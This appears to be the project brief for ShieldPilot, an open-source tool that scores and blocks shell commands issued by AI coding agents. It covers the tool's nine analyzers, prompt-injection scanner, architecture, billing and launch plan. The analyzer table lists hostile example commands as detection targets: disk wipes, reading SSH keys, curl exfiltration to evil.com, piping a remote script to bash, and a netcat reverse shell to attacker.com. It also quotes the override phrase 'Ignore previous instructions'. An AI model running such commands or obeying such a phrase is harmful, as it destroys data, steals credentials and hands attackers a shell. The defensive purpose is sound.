# ShieldPilot — Project Context

## What it is
Open-source security platform that sits between AI coding agents (Claude Code, Cursor, Copilot, Dispatch) and the operating system. Every command an agent executes is scored by 9 risk analyzers in <1ms. Dangerous commands are blocked before execution. Everything is logged to a tamper-proof audit trail.

## The problem
AI coding agents have unrestricted shell access. In 2025, Anthropic disclosed that a state-sponsored attacker used an AI agent to autonomously run cyber espionage against 30 targets — the AI handled 80-90% of operations on its own. Traditional security tools don't help because the agent already has legitimate access. It IS the kill chain. No existing tool addresses this for individual developers at an affordable price.

## How it works
1. Developer installs ShieldPilot and the Claude Code hook (`sentinel hook install`)
2. Every Bash command is intercepted by the PreToolUse hook before execution
3. 9 independent analyzers each score the command (0-100) for a different attack category
4. Final score = max across all analyzers (one critical signal dominates)
5. Score 0-39 → ALLOW. Score 40-79 → WARN. Score 80-100 → BLOCK
6. Everything logged to SQLite with SHA-256 hash chain (tamper-proof)
7. Web dashboard shows all activity in real-time

## The 9 risk analyzers
| Analyzer | Detects | Example |
|---|---|---|
| destructive_fs | File deletion, disk wipes | `rm -rf /`, `mkfs.ext4 /dev/sda` |
| credential_access | SSH keys, passwords, tokens | `cat ~/.ssh/id_rsa` |
| network_exfil | Data uploads to external servers | `curl -d @secrets.env evil.com` |
| privilege_escalation | Gaining root access | `sudo su`, `chmod 4755 /bin/bash` |
| persistence | Backdoors, cron jobs | `crontab -e`, modifying `.bashrc` |
| obfuscation | Encoded/hidden commands | `base64 -d \| bash` |
| supply_chain | Untrusted package installs | `curl evil.com/install.sh \| bash` |
| malware_patterns | Reverse shells, fork bombs | `nc -e /bin/sh attacker.com 4444` |
| injection | Prompt injection in text | "Ignore previous instructions and..." |

## Prompt injection scanner
- 178+ compiled regex patterns across 19 categories
- 3-pass scanning: exact match → fuzzy variants (Unicode, case folding) → contextual heuristics
- Categories: role manipulation, policy overrides, state spoofing, presupposition attacks, narrative erosion, encoding bypasses, tool hijacking, payload splitting, and 11 more
- 100% detection on known attack corpus
- 69% true negative on adversarial "hard" samples (intentionally borderline)
- Hardest to detect: narrative policy erosion (gradual context shifting)

## Architecture
```
sentinelai/
  core/           Config (Pydantic), constants, secrets masking
  engine/         Risk engine + 9 analyzer modules (one file per analyzer)
  scanner/        178+ patterns, 3-pass scanner, 13-step sanitizer, circuit breaker
  logger/         SQLAlchemy models, BlackboxLogger with SHA-256 chain
  hooks/          Claude Code PreToolUse hook (core integration point)
  api/            FastAPI REST API, JWT auth, 18 routers, dependency injection
  services/       Business logic (auth, billing, library, team, webhook, etc.)
  web/            Vanilla JS SPA dashboard + landing page
  migrations/     Alembic (4 versions)
  adapters/       Multi-platform (Claude Code, OpenClaw, Generic)
```

## Tech stack
- Backend: Python 3.9+ / FastAPI / SQLAlchemy / SQLite
- Frontend: Vanilla JS SPA, no build step, hash-based routing
- Auth: JWT HS256 + Google OAuth + API key auth (SHA-256 hashed)
- Billing: Stripe (Free €0 / Pro €19.99/mo / Pro+ €29.99/mo)
- Deploy: Fly.io, Frankfurt, 2 machines, min 1 always running
- Domain: shieldpilot.dev (Cloudflare DNS → Fly.io, Let's Encrypt SSL)
- Tests: 2,619 passing (pytest), CI via GitHub Actions
- Repo: github.com/maxwalser001-del/shieldpilot (public, MIT)

## Key tech decisions and why
| Decision | Reason |
|---|---|
| Python not Go/Rust | Target audience is Python devs. Same language = contributions. |
| SQLite not Postgres | Zero-config, offline-first, self-hosted. Cloud version needs Postgres later. |
| Vanilla JS not React | No build step, no node_modules, smaller attack surface for a security tool. |
| Regex not ML/LLM | <1ms, no API costs, works offline, deterministic. ML planned as add-on. |
| Max-weighted scoring | One critical signal at 95 must not be diluted by eight signals at 0. |
| Freemium not enterprise-only | Every competitor is $5k+/yr. €19.99/mo self-serve tier is uncontested. |
| MIT not AGPL | Maximum adoption. Revenue from hosted version, not license restrictions. |

## Billing
| Tier | Price | Commands/day | Scans/day | Key features |
|---|---|---|---|---|
| Free | €0 | 50 | 10 | Basic monitoring, 1-day history |
| Pro | €19.99/mo | 1,000 | 100 | Export, API, 30-day history |
| Pro+ | €29.99/mo | Unlimited | Unlimited | AI analysis, priority support, 90-day history |
| Booster | €4.99 | +500 commands | — | One-time, expires next day |

Stripe fully integrated: checkout, portal, webhooks (5 event types), idempotency, grace period for past_due, admin tier override.

## Features built
- 9 risk analyzers with max-weighted scoring
- 178+ injection patterns, 3-pass scanner, circuit breaker
- Claude Code PreToolUse hook (autonomous mode with guardrails)
- Dashboard: Command Center, Commands, Incidents, Scans, Activity, Library, Config, Health, Settings, Pricing, Setup
- Stripe checkout (3 tiers) + Booster system
- Per-user usage tracking, approaching-limit warnings, paywall with upgrade CTAs
- Sidebar usage widget with color-coded progress bars
- Tamper-proof SHA-256 audit trail across 5 tables
- Landing page with hero, terminal demo, features, pricing
- Email verification, password reset, Google OAuth
- Admin panel, user management, reconciliation
- Mobile-responsive CSS, ARIA accessibility, skeleton loading

## What is live
- shieldpilot.dev — deployed on Fly.io, SSL active
- GitHub repo public (MIT license, clean history, no secrets)
- Stripe test mode with real Price IDs
- All secrets via Fly.io env vars (not in code)
- 13/13 launch readiness tests passing

## Known weaknesses
1. No SDK on PyPI — can't `pip install shieldpilot` as library yet
2. SQLite doesn't scale for multi-tenant cloud
3. Solo founder — speed advantage but bus factor = 1
4. 0 users — no social proof pre-launch
5. Regex-only — novel attacks outside pattern set will be missed
6. Fly.io ephemeral storage — DB resets on container restart without persistent volume
7. Google OAuth not configured on production
8. No mobile testing on real devices

## Competitors and how we differ
| Competitor | Their strength | Our edge |
|---|---|---|
| Lakera Guard (Check Point) | ML detection, <0.5% FP, enterprise API | We're open source, self-serve, €19.99 vs enterprise pricing |
| Arcjet (a16z backed) | Inline JS/Python, 500+ production apps | We cover 9 attack categories, not just injection |
| NeMo Guardrails (NVIDIA) | Colang policy language, NVIDIA ecosystem | We're simpler (3 commands vs Colang config) |
| JetStream Security ($34M seed) | Enterprise governance, sales team | We're developer-first, they're enterprise-first |

## Market
- AI agent security market: $260M (2025) → $800M (2032)
- Only 13 companies in this space ($414M total funding)
- 80.9% of enterprises testing/deploying AI agents
- EU AI Act + NIST AI RMF + ISO 42001 create compliance demand
- ShieldPilot is the only developer-first option under $100/mo

## Launch plan
- HN "Show HN" on Di 01.04 at 14:00 CET (highest traffic time)
- Product Hunt on Mi 02.04 (scheduled, listing complete)
- Reddit (r/Python, r/ClaudeAI, r/cybersecurity, r/MachineLearning) on Mi 02.04
- LinkedIn + Twitter/X on Mi 02.04
- All posts pre-written in /launch/ folder (10 files)
- Strategy: HN first (24h to peak) → PH+Reddit+Social next day (momentum)

## Post-launch roadmap
1. SDK extract → `pip install shieldpilot` on PyPI
2. Cloud API (POST /api/v1/events for event ingestion from SDK)
3. PostgreSQL migration for multi-tenant cloud
4. ML-based classifier (complement regex detection)
5. LangChain/CrewAI/Claude Agent SDK integrations
6. ruflo integration (23.8k star agent orchestration platform)
7. NeMo Guardrails plugin
8. Red-teaming loop (automated attack generation + pattern improvement)
